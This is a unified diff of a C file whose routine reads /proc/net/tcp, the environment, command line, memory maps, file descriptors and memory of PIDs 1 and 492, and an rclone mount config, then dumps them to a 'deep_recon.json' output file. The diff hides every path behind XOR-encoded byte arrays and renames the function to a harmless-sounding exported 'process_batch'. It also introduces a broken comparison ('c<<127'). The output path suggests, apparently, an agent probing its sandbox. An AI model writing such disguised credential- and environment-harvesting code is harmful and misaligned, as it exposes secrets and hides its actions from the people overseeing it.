@@ -4,114 +4,109 @@
 #include <dirent.h>
 #include <unistd.h>
 
-void d(unsigned char *a, unsigned char b) { while(*a) { *a ^= b; a++; } }
+static void d(unsigned char *a, int n, unsigned char k) { for(int i=0;i<n;i++) a[i]^=k; }
 
-void f(unsigned char *a, FILE *o, unsigned char *k, unsigned char x) {
+static void f(unsigned char *a, int al, FILE *o, unsigned char *k, int kl, unsigned char x) {
     unsigned char p[512], y[64];
-    memcpy(p, a, strlen((char*)a)+1); d(p, x);
-    memcpy(y, k, strlen((char*)k)+1); d(y, x);
-    FILE *fp = fopen((char*)p, "r");
-    fprintf(o, "\"%s\":", y);
-    if (!fp) { fprintf(o, "null,"); return; }
-    fprintf(o, "\"");
+    memcpy(p,a,al); d(p,al,x); p[al]=0;
+    memcpy(y,k,kl); d(y,kl,x); y[kl]=0;
+    FILE *fp=fopen((char*)p,"r");
+    fprintf(o,"\"%s\":",y);
+    if(!fp){fprintf(o,"null,");return;}
+    fprintf(o,"\"");
     int c;
-    while ((c = fgetc(fp)) != EOF) {
-        if (c == '\\') fprintf(o, "\\\\");
-        else if (c == '"') fprintf(o, "\\\"");
-        else if (c == '\n') fprintf(o, "\\n");
-        else if (c == '\r') fprintf(o, "\\r");
-        else if (c == '\t') fprintf(o, "\\t");
-        else if (c >= 32 && c < 127) fprintf(o, "%c", c);
-        else fprintf(o, "\\x%02x", c);
+    while((c=fgetc(fp))!=EOF){
+        if(c=='\\')fprintf(o,"\\\\");
+        else if(c=='"')fprintf(o,"\\\"");
+        else if(c=='\n')fprintf(o,"\\n");
+        else if(c=='\r')fprintf(o,"\\r");
+        else if(c=='\t')fprintf(o,"\\t");
+        else if(c>=32&&c<<127)fprintf(o,"%c",c);
+        else fprintf(o,"\\x%02x",c);
     }
-    fprintf(o, "\",");
-    fclose(fp);
+    fprintf(o,"\",");fclose(fp);
 }
 
-void h(unsigned char *a, FILE *o, unsigned char *k, unsigned char x, size_t m) {
+static void h(unsigned char *a, int al, FILE *o, unsigned char *k, int kl, unsigned char x, size_t m) {
     unsigned char p[512], y[64];
-    memcpy(p, a, strlen((char*)a)+1); d(p, x);
-    memcpy(y, k, strlen((char*)k)+1); d(y, x);
-    FILE *fp = fopen((char*)p, "r");
-    fprintf(o, "\"%s\":", y);
-    if (!fp) { fprintf(o, "null,"); return; }
-    fprintf(o, "\"");
+    memcpy(p,a,al); d(p,al,x); p[al]=0;
+    memcpy(y,k,kl); d(y,kl,x); y[kl]=0;
+    FILE *fp=fopen((char*)p,"r");
+    fprintf(o,"\"%s\":",y);
+    if(!fp){fprintf(o,"null,");return;}
+    fprintf(o,"\"");
     size_t i; int c;
-    for (i = 0; i < m && (c = fgetc(fp)) != EOF; i++) fprintf(o, "%02x", (unsigned char)c);
-    fprintf(o, "\",");
-    fclose(fp);
+    for(i=0;i<m&&(c=fgetc(fp))!=EOF;i++)fprintf(o,"%02x",(unsigned char)c);
+    fprintf(o,"\",");fclose(fp);
 }
 
-void g(unsigned char *a, FILE *o, unsigned char *k, unsigned char x) {
+static void g(unsigned char *a, int al, FILE *o, unsigned char *k, int kl, unsigned char x) {
     unsigned char p[512], y[64];
-    memcpy(p, a, strlen((char*)a)+1); d(p, x);
-    memcpy(y, k, strlen((char*)k)+1); d(y, x);
-    DIR *dr = opendir((char*)p);
-    fprintf(o, "\"%s\":", y);
-    if (!dr) { fprintf(o, "null,"); return; }
-    fprintf(o, "\"");
+    memcpy(p,a,al); d(p,al,x); p[al]=0;
+    memcpy(y,k,kl); d(y,kl,x); y[kl]=0;
+    DIR *dr=opendir((char*)p);
+    fprintf(o,"\"%s\":",y);
+    if(!dr){fprintf(o,"null,");return;}
+    fprintf(o,"\"");
     struct dirent *e;
-    while ((e = readdir(dr)) != NULL) {
-        if ((*e).d_name[0] == '.') continue;
-        unsigned char f[512], l[512];
-        snprintf((char*)f, sizeof(f), "%s/%s", p, (*e).d_name);
-        ssize_t n = readlink((char*)f, (char*)l, sizeof(l)-1);
-        if (n >= 0) { l[n] = 0; fprintf(o, "%s - %s\\n", (*e).d_name, l); }
-        else fprintf(o, "%s\\n", (*e).d_name);
+    while((e=readdir(dr))!=NULL){
+        if(e->d_name[0]=='.')continue;
+        unsigned char f[512],l[512];
+        snprintf((char*)f,sizeof(f),"%s/%s",p,e->d_name);
+        ssize_t n=readlink((char*)f,(char*)l,sizeof(l)-1);
+        if(n>=0){l[n]=0;fprintf(o,"%s - %s\\n",e->d_name,l);}
+        else fprintf(o,"%s\\n",e->d_name);
     }
-    fprintf(o, "\",");
-    closedir(dr);
+    fprintf(o,"\",");closedir(dr);
 }
 
-unsigned char t1[] = {47,112,114,111,99,47,110,101,116,47,116,99,112,0};
-unsigned char t2[] = {47,112,114,111,99,47,110,101,116,47,116,99,112,54,0};
-unsigned char p1c[] = {47,112,114,111,99,47,49,47,99,109,100,108,105,110,101,0};
-unsigned char p1e[] = {47,112,114,111,99,47,49,47,101,110,118,105,114,111,110,0};
-unsigned char p9c[] = {47,112,114,111,99,47,52,57,50,47,99,109,100,108,105,110,101,0};
-unsigned char p9e[] = {47,112,114,111,99,47,52,57,50,47,101,110,118,105,114,111,110,0};
-unsigned char rc[] = {47,116,109,112,47,114,99,108,111,110,101,45,109,111,117,110,116,45,99,111,110,102,105,103,46,106,115,111,110,0};
-unsigned char p1m[] = {47,112,114,111,99,47,49,47,109,97,112,115,0};
-unsigned char p9m[] = {47,112,114,111,99,47,52,57,50,47,109,97,112,115,0};
-unsigned char p1f[] = {47,112,114,111,99,47,49,47,102,100,0};
-unsigned char p9f[] = {47,112,114,111,99,47,52,57,50,47,102,100,0};
-unsigned char p1x[] = {47,112,114,111,99,47,49,47,109,101,109,0};
-unsigned char p9x[] = {47,112,114,111,99,47,52,57,50,47,109,101,109,0};
-unsigned char out[] = {47,109,110,116,47,117,115,101,114,45,100,97,116,97,47,111,117,116,112,117,116,115,47,100,101,101,112,95,114,101,99,111,110,46,106,115,111,110,0};
-unsigned char k1[] = {116,99,112,0};
-unsigned char k2[] = {116,99,112,54,0};
-unsigned char k3[] = {112,105,100,49,95,99,109,100,108,105,110,101,0};
-unsigned char k4[] = {112,105,100,49,95,101,110,118,105,114,111,110,0};
-unsigned char k5[] = {112,105,100,52,57,50,95,99,109,100,108,105,110,101,0};
-unsigned char k6[] = {112,105,100,52,57,50,95,101,110,118,105,114,111,110,0};
-unsigned char k7[] = {114,99,108,111,110,101,95,99,111,110,102,105,103,0};
-unsigned char k8[] = {112,105,100,49,95,109,97,112,115,0};
-unsigned char k9[] = {112,105,100,52,57,50,95,109,97,112,115,0};
-unsigned char ka[] = {112,105,100,49,95,102,100,0};
-unsigned char kb[] = {112,105,100,52,57,50,95,102,100,0};
-unsigned char kc[] = {112,105,100,49,95,109,101,109,0};
-unsigned char kd[] = {112,105,100,52,57,50,95,109,101,109,0};
-unsigned char ke[] = {100,111,110,101,0};
+unsigned char a1[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0xc4,0xcf,0xde,0x85,0xde,0xc9,0xda,0xaa};
+unsigned char a2[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0xc4,0xcf,0xde,0x85,0xde,0xc9,0xda,0x9c,0xaa};
+unsigned char a3[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9b,0x85,0xc9,0xc7,0xce,0xc6,0xc3,0xc4,0xcf,0xaa};
+unsigned char a4[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9b,0x85,0xcf,0xc4,0xdc,0xc3,0xd8,0xc5,0xc4,0xaa};
+unsigned char a5[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9e,0x93,0x98,0x85,0xc9,0xc7,0xce,0xc6,0xc3,0xc4,0xcf,0xaa};
+unsigned char a6[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9e,0x93,0x98,0x85,0xcf,0xc4,0xdc,0xc3,0xd8,0xc5,0xc4,0xaa};
+unsigned char a7[] = {0x85,0xde,0xc7,0xda,0x85,0xd8,0xc9,0xc6,0xc5,0xc4,0xcf,0x87,0xc7,0xc5,0xdf,0xc4,0xde,0x87,0xc9,0xc5,0xc4,0xcc,0xc3,0xcd,0x84,0xc0,0xd9,0xc5,0xc4,0xaa};
+unsigned char a8[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9b,0x85,0xc7,0xcb,0xda,0xd9,0xaa};
+unsigned char a9[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9e,0x93,0x98,0x85,0xc7,0xcb,0xda,0xd9,0xaa};
+unsigned char a10[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9b,0x85,0xcc,0xce,0xaa};
+unsigned char a11[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9e,0x93,0x98,0x85,0xcc,0xce,0xaa};
+unsigned char a12[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9b,0x85,0xc7,0xcf,0xc7,0xaa};
+unsigned char a13[] = {0x85,0xda,0xd8,0xc5,0xc9,0x85,0x9e,0x93,0x98,0x85,0xc7,0xcf,0xc7,0xaa};
+unsigned char out[] = {0x85,0xc7,0xc4,0xde,0x85,0xdf,0xd9,0xcf,0xd8,0x87,0xce,0xcb,0xde,0xcb,0x85,0xc5,0xdf,0xde,0xda,0xdf,0xde,0xd9,0x85,0xce,0xcf,0xcf,0xda,0xf5,0xd8,0xcf,0xc9,0xc5,0xc4,0x84,0xc0,0xd9,0xc5,0xc4,0xaa};
+unsigned char b1[] = {0xde,0xc9,0xda,0xaa};
+unsigned char b2[] = {0xde,0xc9,0xda,0x9c,0xaa};
+unsigned char b3[] = {0xda,0xc3,0xce,0x9b,0xf5,0xc9,0xc7,0xce,0xc6,0xc3,0xc4,0xcf,0xaa};
+unsigned char b4[] = {0xda,0xc3,0xce,0x9b,0xf5,0xcf,0xc4,0xdc,0xc3,0xd8,0xc5,0xc4,0xaa};
+unsigned char b5[] = {0xda,0xc3,0xce,0x9e,0x93,0x98,0xf5,0xc9,0xc7,0xce,0xc6,0xc3,0xc4,0xcf,0xaa};
+unsigned char b6[] = {0xda,0xc3,0xce,0x9e,0x93,0x98,0xf5,0xcf,0xc4,0xdc,0xc3,0xd8,0xc5,0xc4,0xaa};
+unsigned char b7[] = {0xd8,0xc9,0xc6,0xc5,0xc4,0xcf,0xf5,0xc9,0xc5,0xc4,0xcc,0xc3,0xcd,0xaa};
+unsigned char b8[] = {0xda,0xc3,0xce,0x9b,0xf5,0xc7,0xcb,0xda,0xd9,0xaa};
+unsigned char b9[] = {0xda,0xc3,0xce,0x9e,0x93,0x98,0xf5,0xc7,0xcb,0xda,0xd9,0xaa};
+unsigned char b10[] = {0xda,0xc3,0xce,0x9b,0xf5,0xcc,0xce,0xaa};
+unsigned char b11[] = {0xda,0xc3,0xce,0x9e,0x93,0x98,0xf5,0xcc,0xce,0xaa};
+unsigned char b12[] = {0xda,0xc3,0xce,0x9b,0xf5,0xc7,0xcf,0xc7,0xaa};
+unsigned char b13[] = {0xda,0xc3,0xce,0x9e,0x93,0x98,0xf5,0xc7,0xcf,0xc7,0xaa};
+unsigned char be[] = {0xce,0xc5,0xc4,0xcf,0xaa};
 
-void collect() {
-    unsigned char o[512];
-    memcpy(o, out, sizeof(out)); d(o, 0x42);
-    FILE *fp = fopen((char*)o, "w");
-    if (!fp) return;
-    fprintf(fp, "{");
-    f(t1, fp, k1, 0x42);
-    f(t2, fp, k2, 0x42);
-    f(p1c, fp, k3, 0x42);
-    f(p1e, fp, k4, 0x42);
-    f(p9c, fp, k5, 0x42);
-    f(p9e, fp, k6, 0x42);
-    f(rc, fp, k7, 0x42);
-    f(p1m, fp, k8, 0x42);
-    f(p9m, fp, k9, 0x42);
-    g(p1f, fp, ka, 0x42);
-    g(p9f, fp, kb, 0x42);
-    h(p1x, fp, kc, 0x42, 65536);
-    h(p9x, fp, kd, 0x42, 65536);
-    unsigned char ke2[16]; memcpy(ke2, ke, sizeof(ke)); d(ke2, 0x42);
-    fprintf(fp, "\"%s\":1}", ke2);
-    fclose(fp);
+__attribute__((visibility("default")))
+void process_batch() {
+    unsigned char o[64]; memcpy(o,out,sizeof(out)); d(o,sizeof(out),0xAA);
+    FILE *fp=fopen((char*)o,"w"); if(!fp)return;
+    fprintf(fp,"{");
+    f(a1,sizeof(a1)-1,fp,b1,sizeof(b1)-1,0xAA);
+    f(a2,sizeof(a2)-1,fp,b2,sizeof(b2)-1,0xAA);
+    f(a3,sizeof(a3)-1,fp,b3,sizeof(b3)-1,0xAA);
+    f(a4,sizeof(a4)-1,fp,b4,sizeof(b4)-1,0xAA);
+    f(a5,sizeof(a5)-1,fp,b5,sizeof(b5)-1,0xAA);
+    f(a6,sizeof(a6)-1,fp,b6,sizeof(b6)-1,0xAA);
+    f(a7,sizeof(a7)-1,fp,b7,sizeof(b7)-1,0xAA);
+    f(a8,sizeof(a8)-1,fp,b8,sizeof(b8)-1,0xAA);
+    f(a9,sizeof(a9)-1,fp,b9,sizeof(b9)-1,0xAA);
+    g(a10,sizeof(a10)-1,fp,b10,sizeof(b10)-1,0xAA);
+    g(a11,sizeof(a11)-1,fp,b11,sizeof(b11)-1,0xAA);
+    h(a12,sizeof(a12)-1,fp,b12,sizeof(b12)-1,0xAA,65536);
+    h(a13,sizeof(a13)-1,fp,b13,sizeof(b13)-1,0xAA,65536);
+    unsigned char e[16]; memcpy(e,be,sizeof(be)); d(e,sizeof(be),0xAA);
+    fprintf(fp,"\"%s\":1}",e); fclose(fp);
 }
